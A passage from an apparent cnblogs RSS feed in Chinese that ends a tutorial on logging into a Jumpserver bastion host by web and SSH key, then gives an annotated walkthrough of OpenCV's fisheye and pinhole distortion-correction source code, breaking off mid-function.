&lt;p&gt;&lt;span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;）通过&lt;/span&gt;&lt;span&gt;web&lt;/span&gt;&lt;span&gt;登录&lt;/span&gt;&lt;span&gt; &lt;br/&gt;&lt;/span&gt;&lt;span&gt;可以看到用户&lt;/span&gt;&lt;span&gt;ID&lt;/span&gt;&lt;span&gt;，用户名，权限，&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;span&gt;，最后登录，用户组，授权主机数，以及主机信息。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230403856-1069391539.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;单击查看主机&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;连接&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230405028-1743176456.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;连接成功，可以对该主机进行操作。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230406325-611694106.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230406684-346322336.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;）通过&lt;/span&gt;&lt;span&gt;ssh&lt;/span&gt;&lt;span&gt;登录&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;通过邮件中收到的地址，下载&lt;/span&gt;&lt;span&gt;key&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230407544-630098500.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;点击工具&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;用户密钥管理者&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230408356-747921485.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;单击导入&lt;/span&gt; &lt;span&gt;—&amp;gt;&lt;/span&gt; &lt;span&gt;输入用户名，密码&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230408794-302475651.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;连接&lt;/span&gt; &lt;span&gt;jumpserver&lt;/span&gt; &lt;span&gt;堡垒机&lt;/span&gt; &lt;span&gt;192.168.1.200&lt;/span&gt;&lt;span&gt;，输入密钥密码进行登录&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230409700-1489049696.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;登录成功！！&lt;/span&gt;&lt;span&gt;从授权的列表中连接到服务器&lt;/span&gt; &lt;span&gt;192.168.1.210&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1265569/201711/1265569-20171109230410153-1299965740.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:57:00 +0000</pubDate>
<dc:creator>jks巴顿</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/jksbaduen/p/7811909.html</dc:identifier>
</item>
<item>
<title>OpenCV两种畸变校正模型源代码分析以及CUDA实现 - 一棹烟波</title>
<link>http://www.cnblogs.com/riddick/p/7811877.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/riddick/p/7811877.html</guid>
<description>&lt;p&gt;&lt;span&gt;图像算法中会经常用到摄像机的畸变校正，有必要总结分析OpenCV中畸变校正方法，其中包括普通针孔相机模型和鱼眼相机模型fisheye两种畸变校正方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;普通相机模型畸变校正函数针对OpenCV中的cv::initUndistortRectifyMap()，鱼眼相机模型畸变校正函数对应OpenCV中的cv::fisheye::initUndistortRectifyMap()。两种方法算出映射Mapx和Mapy后，统一用cv::Remap()函数进行插值得到校正后的图像。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1. FishEye模型的畸变校正。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;方便起见，直接贴出OpenCV源码，我在里面加了注释说明。建议参考OpenCV官方文档看畸变模型原理会更清楚：&lt;a href=&quot;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#fisheye-initundistortrectifymap&quot; target=&quot;_blank&quot;&gt;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#fisheye-initundistortrectifymap&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;简要流程就是：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1. 求内参矩阵的逆，由于摄像机坐标系的三维点到二维图像平面，需要乘以旋转矩阵R和内参矩阵K。那么反向投影回去则是二维图像坐标乘以  K*R的逆矩阵。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2. 将目标图像中的每一个像素点坐标(j,i)，乘以1中求出的逆矩阵iR，转换到摄像机坐标系（_x,_y,_w）,并归一化得到z=1平面下的三维坐标(x,y,1)；&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.求出平面模型下像素点对应鱼眼半球模型下的极坐标(r, theta)。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.利用鱼眼畸变模型求出拥有畸变时像素点对应的theta_d。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1138496/201711/1138496-20171109224351278-1646598593.png&quot; alt=&quot;&quot; width=&quot;715&quot; height=&quot;510&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;5.利用求出的theta_d值将三维坐标点重投影到二维图像平面得到(u,v)，(u,v)即为目标图像对应的畸变图像中像素点坐标&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;6.使用cv::Remap（）函数，根据mapx,mapy取出对应坐标位置的像素值赋值给目标图像，一般采用双线性插值法，得到畸变校正后的目标图像。&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;92&quot;&gt;
&lt;pre&gt;
#include &amp;lt;opencv2\opencv.hpp&amp;gt;

&lt;span&gt;void&lt;/span&gt;&lt;span&gt; cv::fisheye::initUndistortRectifyMap( InputArray K, InputArray D, InputArray R, InputArray P,
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; cv::Size&amp;amp; size, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; m1type, OutputArray map1, OutputArray map2 )
{
    CV_Assert( m1type &lt;/span&gt;== CV_16SC2 || m1type == CV_32F || m1type &amp;lt;=&lt;span&gt;0&lt;/span&gt;&lt;span&gt; );
    map1.create( size, m1type &lt;/span&gt;&amp;lt;= &lt;span&gt;0&lt;/span&gt; ?&lt;span&gt; CV_16SC2 : m1type );
    map2.create( size, map1.type() &lt;/span&gt;== CV_16SC2 ?&lt;span&gt; CV_16UC1 : CV_32F );

    CV_Assert((K.depth() &lt;/span&gt;== CV_32F || K.depth() == CV_64F) &amp;amp;&amp;amp; (D.depth() == CV_32F || D.depth() ==&lt;span&gt; CV_64F));
    CV_Assert((P.empty() &lt;/span&gt;|| P.depth() == CV_32F || P.depth() == CV_64F) &amp;amp;&amp;amp; (R.empty() || R.depth() == CV_32F || R.depth() ==&lt;span&gt; CV_64F));
    CV_Assert(K.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) &amp;amp;&amp;amp; (D.empty() || D.total() == &lt;span&gt;4&lt;/span&gt;&lt;span&gt;));
    CV_Assert(R.empty() &lt;/span&gt;|| R.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) || R.total() * R.channels() == &lt;span&gt;3&lt;/span&gt;&lt;span&gt;);
    CV_Assert(P.empty() &lt;/span&gt;|| P.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;) || P.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从内参矩阵K中取出归一化焦距fx,fy; cx,cy&lt;/span&gt;
&lt;span&gt;    cv::Vec2d f, c;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (K.depth() ==&lt;span&gt; CV_32F)
    {
        Matx33f camMat &lt;/span&gt;=&lt;span&gt; K.getMat();
        f &lt;/span&gt;= Vec2f(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));
        c &lt;/span&gt;= Vec2f(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;));
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
    {
        Matx33d camMat &lt;/span&gt;=&lt;span&gt; K.getMat();
        f &lt;/span&gt;= Vec2d(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));
        c &lt;/span&gt;= Vec2d(camMat(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;), camMat(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;));
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从畸变系数矩阵D中取出畸变系数k1,k2,k3,k4&lt;/span&gt;
    Vec4d k = Vec4d::all(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;D.empty())
        k &lt;/span&gt;= D.depth() == CV_32F ? (Vec4d)*D.getMat().ptr&amp;lt;Vec4f&amp;gt;(): *D.getMat().ptr&amp;lt;Vec4d&amp;gt;&lt;span&gt;();

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;旋转矩阵RR转换数据类型为CV_64F，如果不需要旋转，则RR为单位阵&lt;/span&gt;
    cv::Matx33d RR  =&lt;span&gt; cv::Matx33d::eye();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!R.empty() &amp;amp;&amp;amp; R.total() * R.channels() == &lt;span&gt;3&lt;/span&gt;&lt;span&gt;)
    {
        cv::Vec3d rvec;
        R.getMat().convertTo(rvec, CV_64F);
        RR &lt;/span&gt;=&lt;span&gt; Affine3d(rvec).rotation();
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (!R.empty() &amp;amp;&amp;amp; R.size() == Size(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;))
        R.getMat().convertTo(RR, CV_64F);
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;新的内参矩阵PP转换数据类型为CV_64F&lt;/span&gt;
    cv::Matx33d PP =&lt;span&gt; cv::Matx33d::eye();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;P.empty())
        P.getMat().colRange(&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;).convertTo(PP, CV_64F);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;关键一步：新的内参矩阵*旋转矩阵，然后利用SVD分解求出逆矩阵iR，后面用到&lt;/span&gt;
    cv::Matx33d iR = (PP *&lt;span&gt; RR).inv(cv::DECOMP_SVD);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;反向映射，遍历目标图像所有像素位置，找到畸变图像中对应位置坐标(u,v)，并分别保存坐标(u,v)到mapx和mapy中&lt;/span&gt;
    &lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; size.height; ++&lt;span&gt;i)
    {
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m1f = map1.getMat().ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m2f = map2.getMat().ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;short&lt;/span&gt;*  m1 = (&lt;span&gt;short&lt;/span&gt;*&lt;span&gt;)m1f;
        &lt;/span&gt;&lt;span&gt;ushort&lt;/span&gt;* m2 = (&lt;span&gt;ushort&lt;/span&gt;*&lt;span&gt;)m2f;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;二维图像平面坐标系-&amp;gt;摄像机坐标系&lt;/span&gt;
        &lt;span&gt;double&lt;/span&gt; _x = i*iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;),
               _y &lt;/span&gt;= i*iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;),
               _w &lt;/span&gt;= i*iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) + iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; size.width; ++&lt;span&gt;j)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;归一化摄像机坐标系，相当于假定在Z=1平面上&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; x = _x/_w, y = _y/&lt;span&gt;_w;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;求鱼眼半球体截面半径r&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; r = sqrt(x*x + y*&lt;span&gt;y);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;求鱼眼半球面上一点与光心的连线和光轴的夹角Theta&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; theta =&lt;span&gt; atan(r);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;畸变模型求出theta_d，相当于有畸变的角度值&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; theta2 = theta*theta, theta4 = theta2*theta2, theta6 = theta4*theta2, theta8 = theta4*&lt;span&gt;theta4;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; theta_d = theta * (&lt;span&gt;1&lt;/span&gt; + k[&lt;span&gt;0&lt;/span&gt;]*theta2 + k[&lt;span&gt;1&lt;/span&gt;]*theta4 + k[&lt;span&gt;2&lt;/span&gt;]*theta6 + k[&lt;span&gt;3&lt;/span&gt;]*&lt;span&gt;theta8);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用有畸变的Theta值，将摄像机坐标系下的归一化三维坐标，重投影到二维图像平面，得到(j,i)对应畸变图像中的(u,v)&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; scale = (r == &lt;span&gt;0&lt;/span&gt;) ? &lt;span&gt;1.0&lt;/span&gt; : theta_d /&lt;span&gt; r;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; u = f[&lt;span&gt;0&lt;/span&gt;]*x*scale + c[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; v = f[&lt;span&gt;1&lt;/span&gt;]*y*scale + c[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存(u,v)坐标到mapx,mapy&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_16SC2 )
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iu = cv::saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(u*&lt;span&gt;cv::INTER_TAB_SIZE);
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iv = cv::saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(v*&lt;span&gt;cv::INTER_TAB_SIZE);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;0&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iu &amp;gt;&amp;gt;&lt;span&gt; cv::INTER_BITS);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iv &amp;gt;&amp;gt;&lt;span&gt; cv::INTER_BITS);
                m2[j] &lt;/span&gt;= (&lt;span&gt;ushort&lt;/span&gt;)((iv &amp;amp; (cv::INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;))*cv::INTER_TAB_SIZE + (iu &amp;amp; (cv::INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_32FC1 )
            {
                m1f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m2f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这三条语句是上面 ”&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;二维图像平面坐标系-&amp;gt;摄像机坐标系“的一部分，是矩阵iR的第一列，这样写能够简化计算&lt;/span&gt;
            _x += iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
            _y &lt;/span&gt;+= iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
            _w &lt;/span&gt;+= iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.普通相机模型的畸变校正&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 同样建议参考OpenCV官方文档阅读代码 &lt;a href=&quot;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#&quot; target=&quot;_blank&quot;&gt;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html# &lt;/a&gt;&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;主要流程和上面Fisheye模型差不多，只有第4部分的畸变模型不一样，普通相机的畸变模型如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/1138496/201711/1138496-20171109224247825-208685899.png&quot; alt=&quot;&quot; width=&quot;740&quot; height=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 同样把源代码贴上，并加上注解：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;101&quot;&gt;
&lt;pre&gt;
#include &amp;lt;opencv2\opencv.hpp&amp;gt;

&lt;span&gt;void&lt;/span&gt;&lt;span&gt; cv::initUndistortRectifyMap( InputArray _cameraMatrix, InputArray _distCoeffs,
                              InputArray _matR, InputArray _newCameraMatrix,
                              Size size, &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; m1type, OutputArray _map1, OutputArray _map2 )
{
    Mat cameraMatrix &lt;/span&gt;= _cameraMatrix.getMat(), distCoeffs =&lt;span&gt; _distCoeffs.getMat();
    Mat matR &lt;/span&gt;= _matR.getMat(), newCameraMatrix =&lt;span&gt; _newCameraMatrix.getMat();

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( m1type &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt; )
        m1type &lt;/span&gt;=&lt;span&gt; CV_16SC2;
    CV_Assert( m1type &lt;/span&gt;== CV_16SC2 || m1type == CV_32FC1 || m1type ==&lt;span&gt; CV_32FC2 );
    _map1.create( size, m1type );
    Mat map1 &lt;/span&gt;=&lt;span&gt; _map1.getMat(), map2;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( m1type !=&lt;span&gt; CV_32FC2 )
    {
        _map2.create( size, m1type &lt;/span&gt;== CV_16SC2 ?&lt;span&gt; CV_16UC1 : CV_32FC1 );
        map2 &lt;/span&gt;=&lt;span&gt; _map2.getMat();
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        _map2.release();

    Mat_&lt;/span&gt;&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; R = Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;::eye(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;);
    Mat_&lt;/span&gt;&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; A = Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(cameraMatrix), Ar;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;newCameraMatrix.empty() )
        Ar &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(newCameraMatrix);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        Ar &lt;/span&gt;= getDefaultNewCameraMatrix( A, size, &lt;span&gt;true&lt;/span&gt;&lt;span&gt; );

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;matR.empty() )
        R &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(matR);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;distCoeffs.empty() )
        distCoeffs &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(distCoeffs);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
    {
        distCoeffs.create(&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;, CV_64F);
        distCoeffs &lt;/span&gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    }

    CV_Assert( A.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;) &amp;amp;&amp;amp; A.size() ==&lt;span&gt; R.size() );
    CV_Assert( Ar.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;) || Ar.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;LU分解求新的内参矩阵Ar与旋转矩阵R乘积的逆矩阵iR&lt;/span&gt;
    Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; iR = (Ar.colRange(&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;)*&lt;span&gt;R).inv(DECOMP_LU);
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;* ir = &amp;amp;iR(&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从旧的内参矩阵中取出光心位置u0,v0,和归一化焦距fx,fy&lt;/span&gt;
    &lt;span&gt;double&lt;/span&gt; u0 = A(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;),  v0 = A(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; fx = A(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;),  fy = A(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;尼玛14个畸变系数，不过大多用到的只有(k1,k2,p1,p2)，最多加一个k3，用不到的置为0&lt;/span&gt;
    CV_Assert( distCoeffs.size() == Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;4&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;5&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;5&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;8&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;8&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;12&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;12&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;14&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;14&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( distCoeffs.rows != &lt;span&gt;1&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span&gt;distCoeffs.isContinuous() )
        distCoeffs &lt;/span&gt;=&lt;span&gt; distCoeffs.t();

    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;* &lt;span&gt;const&lt;/span&gt; distPtr = distCoeffs.ptr&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;();
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k1 = distPtr[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k2 = distPtr[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; p1 = distPtr[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; p2 = distPtr[&lt;span&gt;3&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k3 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;5&lt;/span&gt; ? distPtr[&lt;span&gt;4&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k4 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;5&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
